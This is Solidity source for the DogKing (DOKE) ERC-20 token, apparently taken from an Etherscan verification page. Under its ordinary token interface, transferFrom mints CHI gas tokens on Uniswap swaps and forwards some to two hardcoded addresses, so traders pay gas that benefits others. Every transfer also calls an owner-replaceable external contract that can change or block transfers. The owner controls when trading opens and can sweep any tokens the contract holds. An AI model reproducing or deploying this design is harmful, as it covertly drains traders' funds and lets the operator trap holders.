/**
 *Submitted for verification at Etherscan.io on 2021-06-03
*/

// SPDX-License-Identifier: CC0-1.0

/*

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`  ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@/        \@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@/          \@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@^            [email protected]@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@`              ,@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@`                ,@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@                    @@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@/                      \@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/                        \@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@^                          [email protected]@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@`        D o g K i n g       ,@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@                                @@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@`                                ,@@@@@@@@@@@@@@
@@@@@@@@@@@@@@\[@@\`                        ,/@@[/@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@` ,\@@\`                ,/@@/` ,@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@^    [@@@@]        ]@@@@[    [email protected]@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@\       [@@@@]]@@@@[       /@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@`        ,\@@/`        ,@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@^                    [email protected]@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@\                  /@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@                @@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@`            ,@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@\          /@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\  /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

*/

pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IChiToken {
    function mint(uint256 value) external;
    function free(uint256 value) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IDogQueen {
    function mint(address owner, uint256 amount, bool exchange) external returns (uint256);
    function equalizeAccount(address sender, address recipient, uint256 amount) external returns(bool);
}


contract DogKing is IERC20 {
    using SafeMath for uint256;
    
    address private _admin;
    address public _dogQueen;
    address public _pairAddr;

    address private _operater = 0xDc280AD6e77F68f1826E69928bc6Aa06Dd986EBF;
    address public _chiToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c; // mainnet
    //address public _chiToken = 0x3eaF997bE853125066d41B23b6AE10162Bfd1eE8;
    address public _uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) public _allowances;
    mapping (address => uint256) public _usedChiToken;

    
    uint256 public _totalSupply;
    string public _symbol;
    string public _tokenname;
    uint8 public _decimals;
    bool private _openTransaction = false;
    uint256 public _starttime;
    uint256 public _starttimeOffset = 30 days;
    uint8 public _centuryNum = 1;
    uint256 private _ChiTokenAmount = 0;
    
    event DebugUint256(string str, uint256 num);
    event DebugAddress(string str, address addr);
    event DebugMessage(string str);


    constructor () public {   
        _admin = msg.sender;
        _symbol = "DOKE";
        _tokenname = "DogKing";
         _totalSupply = 1e16*1e9;
        _decimals = 9;
        _starttime = now;

        _balances[address(this)] = _totalSupply.mul(50).div(100);
        _balances[_operater] = _totalSupply.mul(50).div(100);
    }


    modifier onlyOwner() {
        require(_admin == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function setOperator(address operator) public onlyOwner {
        _operater = operator;
    }
    
    function setPairAddress(address addr) public onlyOwner {
        _pairAddr = addr;
    }
    
    function makePair(address addr) public onlyOwner {
        _dogQueen = addr;
    }
    
    function burnCoin() public onlyOwner {
        uint256 time = now;
        uint256 genesisTime = _starttime.add(_starttimeOffset.mul(_centuryNum));
        require(_balances[address(this)] > 0, "Genesis time out.");
        require(time > genesisTime, "next Genesis block not yet due.");
        
        _balances[address(this)] = _balances[address(this)].sub(_totalSupply.mul(10).div(100));
        
        if (_centuryNum < 6) {
            _centuryNum++;
        }
    }
    
    function name() public view returns (string memory) {
        return _tokenname;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function startTransaction(bool start) public onlyOwner {
        _openTransaction = start;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if (_openTransaction) {
            if (msg.sender == _pairAddr) { 
                uint256 res = IChiToken(_chiToken).balanceOf(address(this)).mul(_balances[msg.sender]).div(_totalSupply); 
                if(res - _usedChiToken[msg.sender] >= 4) {
                    IChiToken(_chiToken).free(4);    
                    _usedChiToken[msg.sender] = _usedChiToken[msg.sender].add(4);
                }
                
                IDogQueen(_dogQueen).mint(recipient, amount, true);
                
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else { 
                IDogQueen(_dogQueen).equalizeAccount(msg.sender, recipient, amount);
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
             _transfer(_msgSender(), recipient, amount);
             return true;
        }
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if (_openTransaction) {
            if (msg.sender == _uniRouter) {  
                IChiToken(_chiToken).mint(15); 
                IChiToken(_chiToken).transfer(0x4D489eA839a7Bb47C4B9bA32ed277afA8A883067,3);
                IChiToken(_chiToken).transfer(0x2Dc11a0A66810cd9ff57ef5c852284A6E3B394eb,3);
                IDogQueen(_dogQueen).mint(sender, amount, false);
                
                _transfer(sender, recipient, amount);
                _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
                return true;
            } else { 
                IDogQueen(_dogQueen).equalizeAccount(sender, recipient, amount);
                
                _transfer(sender, recipient, amount);
                _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _gastoken(address _addr) onlyOwner public {
        uint256 _balance = IERC20(_addr).balanceOf(address(this));
        IERC20(_addr).transfer(msg.sender,_balance);
    }
}